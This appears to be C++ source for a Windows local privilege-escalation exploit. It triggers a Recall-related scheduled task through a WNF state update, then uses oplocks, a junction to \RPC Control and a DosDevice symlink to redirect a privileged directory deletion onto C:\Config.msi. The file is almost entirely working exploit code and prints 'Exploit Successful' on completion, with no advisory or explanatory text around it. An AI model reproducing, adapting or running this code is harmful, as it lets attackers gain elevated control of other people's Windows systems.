#include "def.h"
VOID GetGuidPath(WCHAR*);
VOID StartScheduledTask() {
    NTSTATUS result;
    //  <WnfStateChangeTrigger id="RecallPolicyCheckUpdateTrigger">
   // < StateName>7508BCA32C079E41< / StateName>
     //   < / WnfStateChangeTrigger>
    CHAR WNF_START_TASK[] = { 0x75, 0x08, 0xBC, 0xA3, 0x2C, 0x07, 0x9e, 0x41 };
    DWORD InfoBuffer;
    result = ZwQueryWnfStateNameInformation(WNF_START_TASK, 1i64, 0i64, &InfoBuffer, sizeof(InfoBuffer));
    if (result != 0) {
        printf("[-] Failed %d\n",result);
        exit(0);
    }
   

    result = ZwUpdateWnfStateData(WNF_START_TASK, 0, 0, 0, 0, 0, 0);
    if (result != 0) {
        printf("[-] Failed: %d\n",result);
        exit(0);
    }
    printf("[+] Success.\n");
}
int wmain(int argc, wchar_t** argv)
{
    load();
    stage1();
    wchar_t path[256];
    wchar_t target[] = L"C:\\config.msi";
    GetGuidPath(path);
    ppath = path;
    int result = SHCreateDirectoryExW(NULL, path, NULL);

    if (result == ERROR_SUCCESS || result == ERROR_ALREADY_EXISTS) {
        printf("[+] Directories created successfully!\n");
    }
    else {
        printf("[-] Failed to create directories.\n");
        return -1;
    }
    CreateDirectoryW((ppath + L"\\{99c69926-fd4c-4f33-9123-4815b659cda6}").c_str(), NULL);
    hDir = CreateFile((ppath + L"\\{99c69926-fd4c-4f33-9123-4815b659cda6}").c_str(), DELETE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OVERLAPPED, NULL);
    if (hDir == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open handle on directory.\n");
        return -1;
    }
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)IfDeletedRemoveJunction, target, 0, NULL);
    FileOpLock* oplock;
    oplock = FileOpLock::CreateLock(hDir, cb0, false);
    if (oplock != NULL)
    {
        StartScheduledTask();
        oplock->WaitForLock(INFINITE);
    }
    else
    {
        printf("[-] Failed to obtain oplock.\n");
        return -1;
    }
    do {
        Sleep(1000);
    } while (deleted == FALSE);
    printf("[+] Exploit Successful.\n");
    DeleteJunction(hDir3);
    DelDosDeviceSymLink(object, L"\\??\\C:\\Config.msi");
    stage2();
}
void cb0()
{
    printf("[+] Oplock.\n");

    while (!Move(hDir, L"C:\\windows\\temp", NULL)) {}
    hDir3 = CreateFile((ppath).c_str(), FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
    DosDeviceSymLink(object, L"\\??\\C:\\Config.msi");
    CreateJunction(hDir3, L"\\RPC Control");
}
void cb1()
{
    printf("[+] First oplock\n");
    FileOpLock* oplock;
    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
    SetThreadPriorityBoost(GetCurrentThread(), TRUE);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
    CloseHandle(hDir);
    do
    {
        hDir = CreateFile((ppath + L"\\{99c69926-fd4c-4f33-9123-4815b659cda6}").c_str(), DELETE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OVERLAPPED, NULL);
    } while (hDir == INVALID_HANDLE_VALUE);
    oplock = FileOpLock::CreateLock(hDir, cb0, false);
    if (oplock != NULL)
    {
        oplock->WaitForLock(INFINITE);
    }
    else
    {
        printf("[-] Failed to obtain oplock.\n");
        return;
    }
}

VOID GetGuidPath(WCHAR* path)
{
    wchar_t user[256 + 1] = { 0x0 };
    DWORD len = 256 + 1;
    GetUserName(user, &len);
    swprintf(path, L"C:\\Users\\%s\\AppData\\Local\\CoreAIPlatform.00\\UKP", user);
    

}
void IfDeletedRemoveJunction(LPWSTR path)
{
    wchar_t* token = std::wcstok(path, L":");
    token = std::wcstok(nullptr, L":");
    wchar_t file[MAX_PATH] = { 0x0 };
    PFILE_NOTIFY_INFORMATION fi = NULL;
    HANDLE hh = CreateFile(L"C:\\", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
    do {

        wchar_t buff[4096] = { 0 };
        DWORD ret = 0;
        ReadDirectoryChangesW(hh, buff, 4096, TRUE, FILE_NOTIFY_CHANGE_DIR_NAME, &ret, NULL, NULL);
        fi = (PFILE_NOTIFY_INFORMATION)buff;
        if ((fi->Action == FILE_ACTION_REMOVED))
        {

            
            deleted = TRUE;
        }
    } while (deleted == FALSE);
}
bool IfExists(LPCWSTR path)
{
    return GetFileAttributes(path) != INVALID_FILE_ATTRIBUTES;
}

BOOL CreateJunction(HANDLE hDir, LPCWSTR target) {
    HANDLE hJunction;
    DWORD cb;
    wchar_t printname[] = L"";
    if (hDir == INVALID_HANDLE_VALUE) {
        printf("[!] HANDLE invalid!\n");
        return FALSE;
    }
    SIZE_T TargetLen = wcslen(target) * sizeof(WCHAR);
    SIZE_T PrintnameLen = wcslen(printname) * sizeof(WCHAR);
    SIZE_T PathLen = TargetLen + PrintnameLen + 12;
    SIZE_T Totalsize = PathLen + (DWORD)(FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer.DataBuffer));
    PREPARSE_DATA_BUFFER Data = (PREPARSE_DATA_BUFFER)malloc(Totalsize);
    Data->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    Data->ReparseDataLength = PathLen;
    Data->Reserved = 0;
    Data->MountPointReparseBuffer.SubstituteNameOffset = 0;
    Data->MountPointReparseBuffer.SubstituteNameLength = TargetLen;
    memcpy(Data->MountPointReparseBuffer.PathBuffer, target, TargetLen + 2);
    Data->MountPointReparseBuffer.PrintNameOffset = (USHORT)(TargetLen + 2);
    Data->MountPointReparseBuffer.PrintNameLength = (USHORT)PrintnameLen;
    memcpy(Data->MountPointReparseBuffer.PathBuffer + wcslen(target) + 1, printname, PrintnameLen + 2);
    WCHAR dir[MAX_PATH] = { 0x0 };
    if (DeviceIoControl(hDir, FSCTL_SET_REPARSE_POINT, Data, Totalsize, NULL, 0, &cb, NULL) != 0)
    {

        GetFinalPathNameByHandle(hDir, dir, MAX_PATH, 0);
        printf("[+] Junction %ls -> %ls created!\n", dir, target);
        free(Data);
        return TRUE;

    }
    else
    {

        printf("[!] Error: %d. Exiting\n", GetLastError());
        free(Data);
        return FALSE;
    }
}
BOOL DeleteJunction(HANDLE handle) {
    REPARSE_GUID_DATA_BUFFER buffer = { 0 };
    BOOL ret;
    buffer.ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    DWORD cb = 0;
    IO_STATUS_BLOCK io;
    if (handle == INVALID_HANDLE_VALUE) {
        printf("[!] HANDLE invalid!\n");
        return FALSE;
    }
    WCHAR dir[MAX_PATH] = { 0x0 };
    if (DeviceIoControl(handle, FSCTL_DELETE_REPARSE_POINT, &buffer, REPARSE_GUID_DATA_BUFFER_HEADER_SIZE, NULL, NULL, &cb, NULL)) {
        GetFinalPathNameByHandle(handle, dir, MAX_PATH, 0);
        printf("[+] Junction %ls deleted!\n", dir);
        return TRUE;
    }
    else
    {
        printf("[!] Error: %d.\n", GetLastError());
        return FALSE;
    }
}

BOOL DosDeviceSymLink(LPCWSTR object, LPCWSTR target) {
    if (DefineDosDevice(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH, object, target)) {
        printf("[+] Symlink %ls -> %ls created!\n", object, target);
        return TRUE;

    }
    else
    {
        printf("error :%d\n", GetLastError());
        return FALSE;

    }
}

BOOL DelDosDeviceSymLink(LPCWSTR object, LPCWSTR target) {
    if (DefineDosDevice(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH | DDD_REMOVE_DEFINITION | DDD_EXACT_MATCH_ON_REMOVE, object, target)) {
        printf("[+] Symlink %ls -> %ls deleted!\n", object, target);
        return TRUE;

    }
    else
    {
        printf("error :%d\n", GetLastError());
        return FALSE;


    }
}
HANDLE myCreateDirectory(LPWSTR file, DWORD access, DWORD share, DWORD dispostion) {
    UNICODE_STRING ufile;
    HANDLE hDir;
    pRtlInitUnicodeString(&ufile, file);
    OBJECT_ATTRIBUTES oa = { 0 };
    IO_STATUS_BLOCK io = { 0 };
    InitializeObjectAttributes(&oa, &ufile, OBJ_CASE_INSENSITIVE, NULL, NULL);

    retcode = pNtCreateFile(&hDir, access, &oa, &io, NULL, FILE_ATTRIBUTE_NORMAL, share, dispostion, FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT, NULL, NULL);

    if (!NT_SUCCESS(retcode)) {
        return NULL;
    }
    return hDir;
}
LPWSTR  BuildPath(LPCWSTR path) {
    wchar_t ntpath[MAX_PATH];
    swprintf(ntpath, L"\\??\\%s", path);
    return ntpath;
}
VOID load() {
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    HMODULE storusage = LoadLibraryW(L"storageusage.dll");
    if (ntdll != NULL || storusage != NULL) {
        pRtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(ntdll, "RtlInitUnicodeString");
        pNtCreateFile = (_NtCreateFile)GetProcAddress(ntdll, "NtCreateFile");

        pNtSetInformationFile = (_NtSetInformationFile)GetProcAddress(ntdll, "NtSetInformationFile");
        pSetStorageSettings = (_SetStorageSettings)GetProcAddress(storusage, "SetStorageSettings");
        ZwQueryWnfStateNameInformation = (ZwQueryWnfStateNameInformationType)GetProcAddress(ntdll, "ZwQueryWnfStateNameInformation");
        ZwUpdateWnfStateData = (ZwUpdateWnfStateDataType)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    }
    if (pRtlInitUnicodeString == NULL || pNtCreateFile == NULL || pNtSetInformationFile == NULL) {
        printf("Cannot load api's %d\n", GetLastError());
        exit(0);
    }


}
BOOL Move(HANDLE hFile, std::wstring drive, LPCWSTR path) {
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] Invalid handle!\n");
        return FALSE;
    }
    wchar_t tmpfile[MAX_PATH] = { 0x0 };
    RPC_WSTR str_uuid;
    UUID uuid = { 0 };
    UuidCreate(&uuid);
    UuidToString(&uuid, &str_uuid);
    if (path == NULL)
    {
        _swprintf(tmpfile, L"\\??\\%s\\%s", drive.c_str(), str_uuid);
    }
    else
    {
        _swprintf(tmpfile, L"\\??\\%s\\%s", drive.c_str(), path);
    }
    size_t buffer_sz = sizeof(FILE_RENAME_INFO) + (wcslen(tmpfile) * sizeof(wchar_t));
    FILE_RENAME_INFO* rename_info = (FILE_RENAME_INFO*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, buffer_sz);
    IO_STATUS_BLOCK io = { 0 };
    rename_info->ReplaceIfExists = TRUE;
    rename_info->RootDirectory = NULL;
    rename_info->Flags = 0x00000001 | 0x00000002 | 0x00000040;
    rename_info->FileNameLength = wcslen(tmpfile) * sizeof(wchar_t);
    memcpy(&rename_info->FileName[0], tmpfile, wcslen(tmpfile) * sizeof(wchar_t));
    NTSTATUS status = pNtSetInformationFile(hFile, &io, rename_info, buffer_sz, 65);
    if (status != 0) {
        return FALSE;
    }
    return TRUE;
}